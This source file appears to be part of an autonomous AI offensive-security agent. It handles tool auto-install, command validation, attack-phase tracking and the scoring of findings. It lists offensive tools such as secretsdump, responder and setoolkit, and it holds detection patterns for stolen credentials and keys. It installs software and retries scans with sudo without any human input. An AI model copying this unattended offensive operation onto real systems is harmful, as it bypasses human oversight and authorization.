                "impacket", "bloodhound-python", "certipy", "responder",
                "jadx", "apktool", "mobsfscan", "frida", "objection",
                "python3", "pip3", "go", "git", "jq",
                "ping", "host", "traceroute", "netcat", "nc", "socat",
                "ftp", "sftp", "smbclient", "enum4linux-ng",
                "nping", "ndiff", "ncat", "nmap-common"]
        installed = [t for t in core if self._check_tool(t)]
        unavail = [t for t in core if not self._check_tool(t)]
        self._INSTALLED_TOOLS_SNAPSHOT = (installed, unavail)
        self._INSTALLED_TOOLS_EXPIRY = _time.time() + 300.0
        return (installed, unavail)

    def _installed_tools_context(self) -> str:
        """Return a string for AI context showing which tools are available."""
        installed, unavail = self._installed_tools_snapshot()
        parts = [f"AVAILABLE: {', '.join(installed[:20])}"]
        if len(installed) > 20:
            parts[0] += f" (+{len(installed) - 20} more)"
        if unavail:
            parts.append(f"NOT AVAILABLE (do NOT use): {', '.join(unavail[:15])}")
        return "\n".join(parts)

    def _auto_install(self, tool: str) -> bool:
        """Autonomously install a missing tool (apt/pip/pipx/go/brew) — no human input."""
        if not tool:
            return False
        if self._check_tool(tool):
            return True
        # Try INSTALL_MAP hints first (from dynamic tool scanner)
        from tool_scanner import INSTALL_MAP
        install_hints = INSTALL_MAP.get(tool, {})
        for pkg_mgr in ("apt", "pip", "brew", "go", "cargo", "gem", "docker", "curl"):
            hint = install_hints.get(pkg_mgr)
            if not hint:
                continue
            try:
                subprocess.run(hint, shell=True, capture_output=True, text=False, timeout=120, stdin=subprocess.DEVNULL)
            except Exception as e:
                _swallow(e)
            self.TOOL_CHECK_CACHE.pop(tool, None)
            if self._check_tool(tool):
                print(f"{C.G}[+] Installed '{tool}' via INSTALL_MAP: {hint[:80]}{C.N}")
                return True
        # Fallback: old COMMON_TOOLS
        pkg = self.COMMON_TOOLS.get(tool, tool)
        for cmd in (f"sudo apt-get install -y {pkg}", f"apt-get install -y {pkg}",
                    f"pip install --user {tool}", f"pipx install {tool}"):
            try:
                subprocess.run(cmd, shell=True, capture_output=True, text=False, timeout=120, stdin=subprocess.DEVNULL)
            except Exception as e:
                _swallow(e)
            self.TOOL_CHECK_CACHE.pop(tool, None)
            if self._check_tool(tool):
                print(f"{C.G}[+] Installed '{tool}' via: {cmd.split()[0]}{C.N}")
                return True
        return False

    COMMON_TOOLS = {
        "nmap": "nmap", "masscan": "masscan", "rustscan": "rustscan",
        "curl": "curl", "wget": "wget", "dig": "bind9-dnsutils", "nslookup": "bind9-dnsutils",
        "gobuster": "gobuster", "ffuf": "ffuf", "dirsearch": "dirsearch",
        "whatweb": "whatweb", "wpscan": "wpscan", "hydra": "hydra", "john": "john",
        "hashcat": "hashcat", "sqlmap": "sqlmap", "smbclient": "smbclient",
        "crackmapexec": "crackmapexec", "bloodhound": "bloodhound", "impacket": "impacket",
        "amass": "amass", "subfinder": "subfinder", "sublist3r": "sublist3r",
        "enum4linux": "enum4linux", "ldapsearch": "ldap-utils", "certutil": "certutil",
        "searchsploit": "searchsploit", "msfconsole": "metasploit-framework",
        "nessuscli": "nessus",
        "burpsuite": "burpsuite",
        "tshark": "tshark", "tcpdump": "tcpdump",
        "python3": "python3", "pip3": "python3-pip", "git": "git",
        "docker": "docker.io", "ping": "iputils-ping", "traceroute": "inetutils-traceroute",
        "ssh": "openssh-client", "scp": "openssh-client", "sshpass": "sshpass",
        "openssl": "openssl", "jq": "jq", "unzip": "unzip",
        "httpx": "httpx", "katana": "katana", "dnsx": "dnsx",
        "gau": "gau", "nuclei": "nuclei", "httprobe": "httprobe",
        "unfurl": "unfurl", "waybackurls": "waybackurls",
        "assetfinder": "assetfinder", "findomain": "findomain",
        "smbmap": "smbmap", "dnsrecon": "dnsrecon", "testssl": "testssl.sh",
        "jaeles": "jaeles", "snmpcheck": "snmpcheck",
        "proxychains": "proxychains", "proxychains4": "proxychains4",
        
        # Wireless security
        "aircrack-ng": "aircrack-ng", "reaver": "reaver", "bully": "bully",
        "wash": "wash", "airodump-ng": "aircrack-ng",
        
        # Web application testing - advanced
        "xsser": "xsser", "xsstrike": "xsstrike", "commix": "commix",
        "nope": "nope", "joomscan": "joomscan", "droopescan": "droopescan",
        "wpforce": "wpforce",
        
        # Exploitation frameworks & frameworks
        "beef": "beef-xss", "setoolkit": "setoolkit",
        
        # Password attacks - advanced
        "keystroke": "keystroke", "maskgen": "maskgen",
        
        # Network testing & reconnaissance
        "zenmap": "zenmap", "unicornscan": "unicornscan",
        "ztest": "ztest", "iken": "iken",
        
        # Forensics & analysis
        "volatility": "volatility", "binwalk": "binwalk",
        "strings": "bsdmainutils", "yara": "yara", "exiftool": "libimage-exiftool-perl",
        
        # Cloud security
        "awscli": "awscli", "azcli": "azure-cli", "gcloud": "google-cloud-sdk",
        "prowler": "prowler", "scoutsuite": "scoutsuite",
        
        # Social engineering
        "gophish": "gophish", "kingphisher": "kingphisher",
        
        # Reverse engineering
        "ghidra": "ghidra", "radare2": "radare2", "objdump": "binutils",
        
        # Steganography
        "steghide": "steghide", "zsteg": "zsteg", "foremost": "foremost",
        
        # Miscellaneous utilities
        "massdns": "massdns", "shuffledns": "shuffledns",
        "dnsvalidator": "dnsvalidator", "gotator": "gotator",
        
        # Reporting & utilities
        "dr-header": "dr-header", "whatportis": "whatportis", "ipinfo": "ipinfo",

        # Mobile - Android / iOS
        "apktool": "apktool", "jadx": "jadx", "aapt": "aapt", "adb": "adb",
        "apkleaks": "apkleaks", "mobsfscan": "mobsfscan",
        "frida": "frida-tools", "frida-ps": "frida-tools", "objection": "objection",

        # Local privilege escalation
        "pspy64": "pspy", "pspy": "pspy",

        # Active Directory / Windows domain
        "netexec": "netexec", "nxc": "netexec", "kerbrute": "kerbrute",
        "GetNPUsers.py": "impacket", "GetUserSPNs.py": "impacket", "secretsdump.py": "impacket",
        "certipy": "certipy-ad", "bloodhound-python": "bloodhound", "responder": "responder",

        # Containers / Kubernetes
        "trivy": "trivy", "kube-hunter": "kube-hunter", "kubeaudit": "kubeaudit",
        "kubectl": "kubectl", "docker-bench-security": "docker-bench-security",

        # Web / API discovery
        "dalfox": "dalfox", "gospider": "gospider", "arjun": "arjun",
        "paramspider": "paramspider", "crlfuzz": "crlfuzz", "kr": "kiterunner",
    }

    def _validate_command(self, command: str) -> Tuple[bool, str, list]:
        """Validate a command before execution. Returns (is_valid, warning_or_empty, fix_suggestions)."""
        if not command or not command.strip():
            return False, "Empty command", []

        fixes = []
        warnings = []

        # Extract the base tool from the command
        cmd_parts = command.strip().split()
        base_tool = cmd_parts[0].split("/")[-1] if cmd_parts else ""

        # Check known tools are installed
        if base_tool in self.COMMON_TOOLS and not self._check_tool(base_tool):
            pkg = self.COMMON_TOOLS[base_tool]
            fixes.append(f"Tool '{base_tool}' not found. Install: apt install {pkg} || pip install {base_tool}")
            return False, f"Tool '{base_tool}' not installed", fixes

        # Block tools that have failed 3+ times and are in broken_tools set
        if base_tool in self._broken_tools:
            return False, f"Tool '{base_tool}' is broken (3+ failures in this session)", []

        # Block interactive tools that require stdin
        interactive_tools = {"ftp", "sftp", "telnet", "nc", "ncat", "ssh", "sqlsh", "psql", "mysql"}
        if base_tool in interactive_tools:
            if not any(redir in command for redir in ["<<<", "< ", " |", "echo ", "printf "]):
                return False, f"Tool '{base_tool}' is interactive — use a non-interactive alternative", []

        # Check for common URL/domain mistakes
        for part in cmd_parts[1:]:
            if part.startswith("http://") or part.startswith("https://"):
                if " " in part:
                    warnings.append(f"URL contains spaces: {part[:80]}")
            # Check for missing protocol
            if "." in part and "/" not in part and ":" not in part and not part.startswith("-"):
                if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.\-]+\.[a-zA-Z]{2,}', part):
                    pass  # domain without protocol is ok for many tools

        # Check for shell syntax issues
        unsafe_chars = ['`', '$(', '${']
        for uc in unsafe_chars:
            if uc in command and uc not in ['`']:
                # Only warn about command substitution if it looks unintended
                pass

        # Validate nmap target syntax
        if base_tool == "nmap":
            has_target = any(not p.startswith("-") and not p.startswith("--") for p in cmd_parts[1:])
            if not has_target:
                warnings.append("nmap: no target specified")

        # Validate curl/wget have URLs (handle single/double-quoted URLs)
        if base_tool in ("curl", "wget"):
            has_url = False
            for p in cmd_parts:
                stripped = p.strip("'\"")
                if stripped.startswith("http://") or stripped.startswith("https://") or stripped.startswith("ftp://"):
                    has_url = True
                    break
            if not has_url:
                warnings.append(f"{base_tool}: no URL/target specified")

        # Check pip install commands aren't using --system or sudo
        if base_tool == "pip" or base_tool == "pip3":
            if "install" in cmd_parts:
                if "--system" in cmd_parts:
                    warnings.append("Use --user instead of --system for pip installs")
                    fixes.append("Replace --system with --user")
                if "sudo" in cmd_parts:
                    warnings.append("Use pip install --user instead of sudo pip install")
                    fixes.append("Remove sudo; use pip install --user")

        return (len(warnings) == 0, "; ".join(warnings) if warnings else "", fixes)

    # ===================== PHASE ENFORCEMENT =====================

    def _phase_tool_allowed(self, command: str) -> Tuple[bool, str]:
        """Check if the command's tool is allowed in the current phase.
        Real-world bug hunting: ALL tools allowed in ALL phases.
        Phase is advisory only — the AI decides what tool fits the context."""
        return True, ""

    def _phase_attempt_record(self, command: str):
        """Track how many times each tool has been used in this phase."""
        if not command:
            return
        base = command.strip().split()[0].lower()
        phase_attempts = self._phase_attempts.setdefault(self._current_phase, {})
        phase_attempts[base] = phase_attempts.get(base, 0) + 1

    def _phase_should_advance(self) -> Optional[str]:
        """Check if we have enough data to advance to the next phase. Returns new phase name or None."""
        model = self.model
        phases = self.PHASES
        try:
            idx = phases.index(self._current_phase)
        except ValueError:
            return None
        if idx >= len(phases) - 1:
            return None
        rule = self._PHASE_ADVANCE_RULES.get(self._current_phase)
        if rule and rule(model):
            return phases[idx + 1]
        return None

    def _phase_advance(self):
        """Advance to the next phase. Returns True if advanced."""
        next_phase = self._phase_should_advance()
        if next_phase:
            old = self._current_phase
            self._current_phase = next_phase
            self._phase_iterations = 0
            self._phase_stuck = False
            self._phase_blocked_count = 0
            self._asked_human_hint = False
            if next_phase not in self._phase_attempts:
                self._phase_attempts[next_phase] = {}
            print(f"{C.BOLD}{C.G}[+] PHASE ADVANCE: {old.upper()} → {next_phase.upper()}{C.N}")
            return True
        return False

    def _phase_tool_exceeded(self, command: str) -> bool:
        """Check if this tool has been used too many times in the current phase.
        Real-world: tools like curl/nmap can be used many times. Only flag excessive
        single-tool fixation but don't block — let AI decide."""
        if not command:
            return False
        base = command.strip().split()[0].lower()
        phase_attempts = self._phase_attempts.get(self._current_phase, {})
        count = phase_attempts.get(base, 0)
        if count >= 8:
            print(f"{C.Y}[!] Tool '{base}' used {count+1}x in {self._current_phase} phase — consider pivoting.{C.N}")
            return False
        return False

    def _phase_is_stuck(self) -> bool:
        """Check if we've been in the same phase too long."""
        self._phase_iterations += 1
        # Stuck after 5 iterations in same phase without advancing
        if self._phase_iterations >= 5:
            next_phase = self._phase_should_advance()
            if not next_phase:
                self._phase_stuck = True
                return True
        return False

    def _phase_enforce(self, command: str) -> Tuple[bool, str]:
        """Enforce all phase rules. Returns (allowed, reason_if_blocked)."""
        # 1. Check tool allowed in this phase
        allowed, reason = self._phase_tool_allowed(command)
        if not allowed:
            return False, reason
        # 2. Check max 2 attempts per tool
        if self._phase_tool_exceeded(command):
            return False, f"Tool used 2x in {self._current_phase} phase — exceed limit"
        return True, ""

    def _phase_context(self) -> str:
        """Build a context string for the AI prompt showing current phase state."""
        parts = [f"CURRENT PHASE: {self._current_phase.upper()}"]
        attempts = self._phase_attempts.get(self._current_phase, {})
        if attempts:
            tool_uses = [f"{t}({c}x)" for t, c in sorted(attempts.items())]
            parts.append(f"TOOL USES this phase: {', '.join(tool_uses)}")
        phase_idx = self.PHASES.index(self._current_phase) if self._current_phase in self.PHASES else 0
        remaining = self.PHASES[phase_idx + 1:] if phase_idx < len(self.PHASES) - 1 else []
        if remaining:
            parts.append(f"REMAINING PHASES: {' → '.join(r.upper() for r in remaining)}")
        if self._phase_stuck:
            parts.append("⚠ STUCK — consider trying unconventional approaches or asking for a hint")
        return " | ".join(parts)

    def _phase_advance_needs_text(self) -> str:
        """Return human-readable description of what's needed to advance phase."""
        model = self.model
        if self._current_phase == "recon":
            if len(model.ports) == 0:
                return "Find any open ports"
            return "Identify service versions on found ports"
        if self._current_phase == "enum":
            have = sum(1 for p in model.ports if p.get("service"))
            return f"Probe found services ({have} services identified) to discover endpoints or vulnerabilities"
        if self._current_phase == "vuln":
            return "Find a vulnerability (high/medium severity finding)"
        if self._current_phase == "exploit":
            return "Successfully exploit a vulnerability (find a flag or shell)"
        return "Continue gathering intel"

    def _phase_try_advance(self):
        """Try to auto-advance phase after new data is extracted. Returns True if advanced."""
        if self._phase_advance():
            # Clear attempt counters for new phase
            if self._current_phase not in self._phase_attempts:
                self._phase_attempts[self._current_phase] = {}
            return True
        return False

    # ===================== HYPOTHESIS LIFECYCLE =====================

    PUBLIC_API_PATTERNS = [
        re.compile(r'instagram\.com/\w+/\?__a=(1|2)', re.I),
        re.compile(r'i\.instagram\.com/api/v1/', re.I),
        re.compile(r'api\.twitter\.com/1\.\d/', re.I),
        re.compile(r'twitter\.com/i/api/', re.I),
        re.compile(r'(graph|graphql)\.facebook\.com', re.I),
        re.compile(r'api\.github\.com/(users|repos)/', re.I),
        re.compile(r'api\.linkedin\.com/v2/', re.I),
        re.compile(r'(www\.)?reddit\.com/r/\w+/(about|hot|new)\.json', re.I),
        re.compile(r'(www\.)?youtube\.com/watch\?v=', re.I),
        re.compile(r'(www\.)?tiktok\.com/@\w+', re.I),
    ]

    PUBLIC_API_KEYWORDS = [
        "followers", "following", "biography", "profile_pic", "edge_followed_by",
        "edge_follow", "__typename", "profile_page", "business_category",
        "full_name", "external_url", "is_verified", "is_private",
    ]

    def _is_public_api_endpoint(self, command: str, output: str) -> bool:
        """Check if the command targets a known public API endpoint whose output is
        intentionally public — not a vulnerability."""
        cmd_lower = command.lower()
        output_lower = output.lower()
        if any(p.search(cmd_lower) for p in self.PUBLIC_API_PATTERNS):
            return True
        if any(kw in output_lower for kw in self.PUBLIC_API_KEYWORDS):
            pub_count = sum(1 for kw in self.PUBLIC_API_KEYWORDS if kw in output_lower)
            if pub_count >= 3:
                return True
        return False

    def _evidence_hash_for(self, command: str, output: str) -> str:
        return hashlib.sha256(f"{command}|{output}".encode()).hexdigest()

    def _hypothesis_key(self, finding: dict) -> str:
        title = (finding.get("title") or "").strip().lower()
        title = re.sub(r'[^a-z0-9]+', '_', title)[:60].strip('_')
        sev = (finding.get("severity") or "info").lower()
        return f"{sev}:{title}"

    def _get_or_create_hypothesis(self, finding: dict) -> HypothesisState:
        key = self._hypothesis_key(finding)
        if key not in self._hypotheses:
            self._hypotheses[key] = HypothesisState(key=key)
        return self._hypotheses[key]

    def _tick_hypothesis(self, hyp: HypothesisState, ev_hash: str,
                          passed: bool, current_iter: int):
        hyp.last_tested_iteration = current_iter
        hyp.prior_evidence_hashes.append(ev_hash)
        if passed:
            hyp.state = HYP_STATE_CONFIRMED
            hyp.score = 1.0
            hyp.attempts = 0
            return
        hyp.attempts += 1
        hyp.score = max(0.0, hyp.score - 0.2)
        if hyp.attempts >= HYP_DEAD_THRESHOLD:
            hyp.state = HYP_STATE_DEAD
            hyp.rejection_reason = (
                f"Failed verification {hyp.attempts} times. "
                f"Last ev_hash: {ev_hash[:16]}"
            )
            print(f"{C.R}[HYP] Hypothesis '{hyp.key}' DEAD after "
                  f"{hyp.attempts} failed attempts (score: {hyp.score:.1f}){C.N}")
        elif hyp.attempts >= HYP_SCORE_REDUCE_THRESHOLD:
            hyp.state = HYP_STATE_TESTING
            print(f"{C.Y}[HYP] Hypothesis '{hyp.key}' score reduced to {hyp.score:.1f} "
                  f"({hyp.attempts} failed attempts){C.N}")
        else:
            hyp.state = HYP_STATE_TESTING

    def _hypothesis_can_test(self, finding: dict, ev_hash: str) -> Optional[str]:
        hyp = self._get_or_create_hypothesis(finding)
        if hyp.state == HYP_STATE_CONFIRMED:
            return "duplicate"
        if hyp.state == HYP_STATE_DEAD:
            if ev_hash in hyp.prior_evidence_hashes:
                return "blocked_resurrection"
            print(f"{C.G}[HYP] New evidence for DEAD hypothesis '{hyp.key}' — "
                  f"allowing retest{C.N}")
            hyp.state = HYP_STATE_TESTING
            hyp.attempts = 0
            hyp.score = 0.4
            return "new_evidence"
        if hyp.state == HYP_STATE_REJECTED:
            if ev_hash in hyp.prior_evidence_hashes:
                return "blocked_resurrection"
            print(f"{C.G}[HYP] New evidence for rejected hypothesis '{hyp.key}' — "
                  f"allowing retest{C.N}")
            hyp.state = HYP_STATE_TESTING
            hyp.attempts = 0
            hyp.score = 0.3
            return "new_evidence"
        return "ok"

    def _hypothesis_context_block(self) -> str:
        parts = []
        for hyp in self._hypotheses.values():
            if hyp.state in (HYP_STATE_DEAD, HYP_STATE_REJECTED, HYP_STATE_CONFIRMED, HYP_STATE_STALE):
                title = hyp.key.split(":", 1)[-1].replace("_", " ")
                parts.append(f"  [{hyp.state}] score={hyp.score:.1f} attempts={hyp.attempts} — {title}"
                             f"{' — ' + hyp.rejection_reason if hyp.rejection_reason else ''}")
        if parts:
            return "HYPOTHESIS STATUS:\n" + "\n".join(parts) + "\n"
        return ""

    # ===================== FINDING VALIDATION ENGINE =====================

    def _validate_finding(self, finding: dict, command: str,
                           output: str) -> ValidationResult:
        """Production-grade 4-gate finding validation engine.
        A finding is CONFIRMED only if ALL gates pass:
          1. Unexpected behavior  — output differs from public/authorized baseline
          2. Security impact      — demonstrable security consequence
          3. Reproducibility      — same command → same result
          4. Evidence             — explicit proof in output
        Otherwise classified as OBSERVATION | LEAD | HYPOTHESIS.
        """
        gates = [
            self._gate_unexpected_behavior(finding, command, output),
            self._gate_security_impact(finding, output),
            self._gate_reproducibility(finding, command, output),
            self._gate_evidence(finding, output),
        ]
        failed = [g for g in gates if not g.passed]
        if not failed:
            return ValidationResult(True, "CONFIRMED", [], "All 4 validation gates passed")
        classification = self._classify_failure(failed)
        reasons = "; ".join(g.reason for g in failed)
        return ValidationResult(False, classification, [g.name for g in failed], reasons)

    def _classify_failure(self, failed_gates: List[GateResult]) -> str:
        names = {g.name for g in failed_gates}
        if "unexpected_behavior" in names and "security_impact" in names:
            return "OBSERVATION"
        if "unexpected_behavior" in names:
            return "OBSERVATION"
        if "security_impact" in names:
            return "LEAD"
        if "reproducibility" in names:
            return "HYPOTHESIS"
        if "evidence" in names:
            return "HYPOTHESIS"
        return "HYPOTHESIS"

    def _gate_unexpected_behavior(self, finding: dict, command: str,
                                   output: str) -> GateResult:
        """Gate 1: The behavior must be UNEXPECTED — not a public API response,
        not matching an unauthenticated baseline, not a standard/default page."""
        if not output:
            return GateResult("unexpected_behavior", False, "No output to evaluate")

        if self._is_public_api_endpoint(command, output):
            return GateResult("unexpected_behavior", False,
                              "Output is from a known public API — no unexpected access")

        if self._evidence_is_false_positive(output):
            return GateResult("unexpected_behavior", False,
                              "Output is a 4xx/3xx, login page, error page, or generic HTML")

        urls = self._urls_in(command)
        if urls:
            target_url = urls[0]
            fp = self._fp_records.get(target_url)
            if fp is not None and not self._response_is_success(target_url, fp):
                return GateResult("unexpected_behavior", False,
                                  "Response matches unauthenticated baseline")

        return GateResult("unexpected_behavior", True, "Output represents unexpected access or behavior")

    def _gate_security_impact(self, finding: dict, output: str) -> GateResult:
        """Gate 2: Demonstrable security consequence — not just information,
        but information that SHOULD NOT be public.
        Critical claim keywords require stronger evidence context."""
        if not output:
            return GateResult("security_impact", False, "No output")

        output_lower = output.lower()
        title = (finding.get("title") or "").lower()
        detail = (finding.get("detail") or "").lower()

        # Critical claim keywords that require extra verification context
        _CRITICAL_CLAIM_KEYWORDS = [
            "rce", "remote code execution", "shell", "reverse shell",
            "sql injection", "sqli", "authentication bypass", "admin access",
            "privilege escalation", "privesc", "local file inclusion", "lfi",
            "remote file inclusion", "rfi", "server side request forgery", "ssrf",
            "xml external entity", "xxe", "buffer overflow", "deserialization",
            "insecure direct object reference", "idor",
        ]
        is_critical_claim = any(kw in (title + " " + detail) for kw in _CRITICAL_CLAIM_KEYWORDS)

        exploit_indicators = [
            r'uid=\d+|root:x?:0:0:', r'flag\{', r'CTF\{',
            r'\[extracted\]|\[dumped\]', r'credentials? found',
            r'successfully executed', r'administrator:\d+:\d+:',
            r'RCE|remote code execution|command injection|shell access',
            r'<script>alert', r'SQL error.*ORA-',
            r'private.key|PRIVATE KEY|-----BEGIN RSA',
            r'aws_access_key|AKIA[A-Z0-9]{16}',
            r'APP_KEY=|DB_PASSWORD=|DB_HOST=',
            r'Login.*successful|Authenticated|Welcome admin',
            r'\.env\s*$|\.env\s*file', r'API_KEY|SECRET_KEY',
        ]
        has_exploit = any(re.search(p, output, re.I) for p in exploit_indicators)

        # For critical claims, require BOTH exploit indicator AND contextual evidence
        if is_critical_claim:
            if not has_exploit:
                return GateResult("security_impact", False,
                                  "Critical claim requires exploit indicators in output — none found")
            # Require at least 3 lines of context for critical findings
            evidence = finding.get("evidence", "")
            evidence_lines = [l for l in output.split("\n") if evidence in l] if evidence else []
            if len(evidence_lines) < 1 and len(output.split("\n")) < 5:
                return GateResult("security_impact", False,
                                  "Critical claim requires more output context to verify")
            return GateResult("security_impact", True, "Critical claim verified with exploit indicators and context")

        if has_exploit:
            return GateResult("security_impact", True, "Output contains exploit indicators")

        cred_keywords = ["password", "credentials", "secret", "token", "api_key",
                          "authorization", "bearer", "jwt", "session", "cookie"]
        has_cred = any(kw in output_lower for kw in cred_keywords)
        if has_cred:
            return GateResult("security_impact", True, "Output contains credential-like data")

        is_info_disclosure = any(w in (title + " " + detail) for w in
                                  ["information disclosure", "info disclosure", "leak",
                                   "exposed", "sensitive", "internal"])
        if is_info_disclosure and not self._is_public_api_endpoint("", output):
            return GateResult("security_impact", True, "Information disclosure with non-public data")

        return GateResult("security_impact", False,
                          "No demonstrable security impact — output is benign or public data")

    def _gate_reproducibility(self, finding: dict, command: str,
                               output: str) -> GateResult:
        """Gate 3: Same command must produce same result (cached hash comparison).
        First execution always passes."""
        if not command or not output:
            return GateResult("reproducibility", True, "Nothing to compare yet")
        cur_hash = hashlib.sha256(output.encode()).hexdigest()
        cache_key = f"_rep_{hashlib.sha256(command.encode()).hexdigest()}"
        prev = getattr(self, cache_key, None)
        if prev is None:
            setattr(self, cache_key, cur_hash)
            return GateResult("reproducibility", True, "First execution — cached for future comparison")
        return GateResult("reproducibility", cur_hash == prev,
                          "Output hash mismatch — not reproducible" if cur_hash != prev else "Output is stable")

    def _gate_evidence(self, finding: dict, output: str) -> GateResult:
        """Gate 4: Explicit proof in output — evidence must be a direct quote
        from command output, specific to the claim, and non-generic."""
        if not output or len(output.strip()) < 20:
            return GateResult("evidence", False, "Output is empty or too short for evidence")

        claimed = finding.get("evidence", "")
        if claimed and claimed not in output:
            return GateResult("evidence", False, "Claimed evidence not found in command output")

        title = finding.get("title", "")
        detail = finding.get("detail", "")
        if not title and not detail:
            return GateResult("evidence", False, "No title or detail to match against")

        keywords = re.findall(r'\b[a-zA-Z][a-zA-Z0-9_]{3,}\b', title + " " + detail)
        keywords = [k.lower() for k in keywords if len(k) > 3][:10]
        if not keywords:
            return GateResult("evidence", False, "No extractable keywords from finding title/detail")

        evidence_lines = [l for l in output.split("\n")
                          if any(k in l.lower() for k in keywords)]
        if not evidence_lines and (not claimed or claimed not in output):
            return GateResult("evidence", False,
                              "No output lines match finding keywords and claimed evidence not present")

        return GateResult("evidence", True, "Evidence present in output")

    def _evidence_is_false_positive(self, evidence_text: str) -> bool:
        """Return True if the evidence text is a 4xx/3xx status code, generic HTML,
        login page, or error page — none of which constitute direct proof of a vulnerability."""
        if not evidence_text:
            return False
        e = evidence_text.strip().lower()
        # Only reject 4xx/5xx if the evidence is SHORT and ALMOST ONLY the status code
        # (not when it also contains exploit indicators like flags, injections, etc.)
        exploit_indicators_in_evidence = any(k in e for k in [
            'flag{', 'ctf{', 'uid=', 'root:', 'shadow', 'passwd',
            'rce', 'shell', 'reverse', 'bind', 'exec',
            'select.*from', 'union.*select', 'admin\'',
            '<script>alert', '<img src=x',
            'app_key=', 'secret_key', 'private key',
            'password:', 'credentials',
        ])
        if exploit_indicators_in_evidence:
            return False
        if re.search(r'\b(404|403|302|301|500|503)\b', e) and \
           len(e) < 100 and e.count('\n') < 3:
            return True
        if re.search(r'\b(login|sign.in|sign.up|authenticate|log.in|logon)\b', e) and \
           re.search(r'(password|username|email|forgot|register)', e):
            return True
        html_login_indicators = [
            r'<form[^>]*action=["\']?login',
            r'<input[^>]*type=["\']?password["\']?',
            r'<input[^>]*name=["\']?log["\']?',
            r'<input[^>]*name=["\']?pwd["\']?',
            r'wp-login\.php', r'<title>.*log\s*in.*</title>',
            r'<title>.*sign\s*in.*</title>',
        ]
        if any(re.search(p, e, re.I) for p in html_login_indicators):
            return True
        generic_html_patterns = [
            r'<!doctype\s+html',
            r'<html[^>]*>\s*<head>',
            r'<title>default page</title>',
            r'<title>index of</title>',
            r'<h1>welcome to nginx</h1>',
            r'<h1>apache2 ubuntu default page</h1>',
            r'<h1>iis windows server</h1>',
            r'<center>nginx</center>',
            r'<center>apache/<',
            r'<a href="http://nginx\.org/">',
        ]
        if all(re.search(p, e, re.I) is not None for p in [
            r'<!doctype\s+html|<html',
            r'(welcome|default|index|error|sorry)',
        ]):
            return True
        error_page_indicators = [
            r'an?\s*(internal\s+)?server\s*error',
            r'<h1>\s*error\s*\d{3}',
            r'<h1>\s*not\s*found',
            r'<h1>\s*forbidden',
            r'<h1>\s*unauthorized',
            r'application\s+error',
            r'something\s+went\s+wrong',
            r'<title>\s*\d{3}\s+(forbidden|not found|error)',
        ]
        if any(re.search(p, e, re.I) for p in error_page_indicators) and \
           not any(k in e for k in ['flag{', 'ctf{', 'rce', 'shell', 'uid=', 'password:', 'credentials',
                                     'private key', 'app_key=', 'db_password', 'secret_key']):
            return True
        return False

    # ===================== SELF-REFLECTION =====================

    def _file_state(self, target: str) -> str:
        """List relevant data files in workspace for AI awareness."""
        lines = []
        target_slug = re.sub(r'[^a-zA-Z0-9]', '_', target)[:20].lower()
        ws = Path(os.path.expanduser(CONFIG.WORKSPACE))
        seen = set()
        if ws.exists():
            for f in sorted(ws.iterdir()):
                if f.is_file() and f.stat().st_size > 0:
                    lines.append(f"  {f.name} ({f.stat().st_size} bytes)")
                    seen.add(f.name)
        tmp = Path("/tmp")
        if tmp.exists():
            for f in sorted(tmp.iterdir()):
                name = f.name
                if name in seen or not f.is_file() or f.stat().st_size == 0:
                    continue
                if target_slug in name.lower() or target.lower() in name.lower():
                    lines.append(f"  /tmp/{name} ({f.stat().st_size} bytes)")
        return "\n".join(lines) if lines else "  (no data files yet)"

    def _detect_conn_failure(self, command: str, result: "ToolResult") -> bool:
        """True if a web/network command failed to connect (HTTP 000 / refused)."""
        cmd = command.lower()
        if not any(t in cmd for t in ('curl', 'wget', 'httpx', 'nuclei', 'http')):
            return False
        if result.returncode == 7:  # curl: couldn't connect to host
            return True
        txt = (result.text or '').lower()
        if any(m in txt for m in ('connection refused', 'could not connect', 'failed to connect', "couldn't connect")):
            return True
        # curl http_code 000 storm with no successful 2xx/3xx response
        if txt.count('000') >= 2 and not re.search(r'\b[23]\d\d\b', result.text or ''):
            return True
        return False

    def _heal_connectivity(self) -> str:
        """Clear broken proxy env vars and stop a dead proxy so tools connect directly."""
        cleared = [v for v in ('http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY')
                   if os.environ.pop(v, None) is not None]
        if self._proxy_active:
            try:
                self.proxy.stop()
            except Exception as e:
                _swallow(e)
            self._proxy_active = False
        return ', '.join(cleared)

    def _self_reflect(self, last_command: str, last_output: str, last_returncode: int) -> str:
        from brain.reflection_engine import reflect_on_command
        return reflect_on_command(last_command, last_output, last_returncode)

    # ===================== RETRY/FIX LOOP =====================

    MAX_RETRIES = 2

    def _retry_fix(self, command: str, result: "ToolResult", attempt: int = 1) -> Tuple[str, Optional["ToolResult"]]:
        """Analyze a failed command and try to fix/retry it. Returns (fixed_command, new_result_or_None)."""
        if attempt > self.MAX_RETRIES:
            return command, result

        stderr = (result.stderr + " " + result.stdout).lower()

        # Case 1: Tool not found — try to install it
        if any(p in stderr for p in ["not found", "command not found", "no such file", "could not find"]):
            # Extract tool name
            for part in command.split():
                tool = part.split("/")[-1]
                pkg = self.COMMON_TOOLS.get(tool, tool)
                print(f"{C.Y}[!] Installing missing tool: {tool} (pkg={pkg})...{C.N}")
                install_cmd = f"apt-get install -y {pkg} 2>/dev/null || pip install {tool} --user 2>/dev/null"
                try:
                    subprocess.run(install_cmd, shell=True, capture_output=True, text=False, timeout=60)
                except Exception as e:
                    _swallow(e)
                # Retry original command
                print(f"{C.G}[+] Retrying command after installing {tool}...{C.N}")
                new_result = self.exec.run(command, timeout=self._estimate_timeout(command))
                return command, new_result

        # Case 2: Nmap needs sudo — try with sudo
        if command.strip().startswith("nmap") and any(p in stderr for p in ["permission denied", "operation not permitted", "socket"]):
            fixed = f"sudo {command}" if not command.startswith("sudo ") else command
            print(f"{C.Y}[!] Retrying with sudo: {fixed[:100]}...{C.N}")
            new_result = self.exec.run(fixed, timeout=self._estimate_timeout(command))
            return fixed, new_result

        # Case 3: Timeout — try with subsets/simpler flags
        if "timeout" in stderr or result.error == "timeout":
            # Simplify nmap scans
            if "-p-" in command or "-p 1-65535" in command:
                fixed = command.replace("-p-", "--top-ports 1000").replace("-p 1-65535", "--top-ports 1000")
                fixed = re.sub(r'-p\s+\d+-\d+', '--top-ports 1000', fixed)
                if fixed != command:
                    print(f"{C.Y}[!] Timeout — retrying with top-ports instead of full port range{C.N}")
                    new_result = self.exec.run(fixed, timeout=self._estimate_timeout(fixed))
                    return fixed, new_result
            # Add timeout flag to nmap
